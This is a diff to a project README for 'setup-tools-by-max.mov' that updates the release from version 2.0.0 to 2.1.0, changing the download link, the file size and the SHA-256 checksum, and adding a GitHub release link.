@@ -8,14 +8,15 @@
   <a href="https://github.com/Tensionix/setup-tools-by-max.mov/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/github/license/Tensionix/setup-tools-by-max.mov?style=flat-square&color=5fd08a&logo=apache&logoColor=white&cacheSeconds=3600"></a>
 </p>
 
-**Version 2.0.0** · 2026-09-27 · 87.7 MB
+**Version 2.1.0** · 2026-09-27 · 88.2 MB
 
-- [Direct download](https://audion.dev/get/setup-tools-by-max.mov/2.0.0/Audion_Setup_Tools_by_Max.mov_v2.0.0_Full.zip) — unmetered, no rate limits
+- [Direct download](https://dl.audion.dev/setup-tools-by-max.mov/2.1.0/Audion_Setup_Tools_by_Max.mov_v2.1.0_Full.zip) — unmetered, no rate limits
 - [Project page](https://audion.dev/downloads/setup-tools-by-max.mov) — every version and how to install
+- [GitHub release](https://github.com/Tensionix/setup-tools-by-max.mov/releases/tag/v2.1.0)
 
 <p align="center"><img src="Docs/screenshot.png" alt="The program window" width="560"></p>
 
-`SHA-256: eae6c1b087b47f2f1712733bb9cb3b0248d4eaa14912efc42cc92e795f5a5db9`
+`SHA-256: ae5f32aab26d6eb825cdcc94f33ee851701716937fa7397e95cbaa620857e901`
 
 ---
 
